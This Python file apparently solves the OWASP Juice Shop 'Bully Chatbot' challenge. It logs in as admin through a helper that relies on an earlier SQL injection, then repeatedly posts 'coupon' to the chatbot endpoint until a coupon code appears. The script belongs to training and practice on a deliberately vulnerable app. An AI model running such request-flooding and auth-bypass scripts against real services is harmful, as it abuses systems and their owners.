"""
This file is used to solve the OWASP Juice-shop Task BULLY CHATBOT
Methodology: We can send the COUPON message to the supporter machine several times, until it gives us COUPON
"""
from plugins import attack as a

class test_get_coupon_class(a.attack_inter):
    def __init__(self):
        self.juice_session = a.requests.session()
        self.url = a.URL + '/rest/chatbot/respond'

    def generator(self):
        cookie, header= a.get_auth('admin')
        json_data = {
            'action': 'query',
            'query': 'coupon',
        }

        return json_data, cookie,header

    def run(self):
        a.logging.basicConfig(filename='./test_logging_info.log', encoding='utf-8',
                            level=a.logging.INFO, format='%(asctime)s %(message)s')
        logger = a.logging.getLogger("Get Coupon")
        a.logging.info(logger)
        a.logging.info('Started')
        json_data, cookie,header = self.generator()
        if cookie:
            response = self.juice_session.post(self.url, json=json_data, headers=header)
            while (response.text.find("pes[Cga+jm") == -1 ):
                # cookies, headers, json_data = self.generator(json_data, new_cookie)
                response = self.juice_session.post(self.url, json=json_data, headers=header)
                print(response.text)

            print("we found coupon:")
            print(response.text)
            a.logging.info('Finished')
        else:
            print("Not have authentification yet, please try SQL injection first")
            a.logging.info('Finished')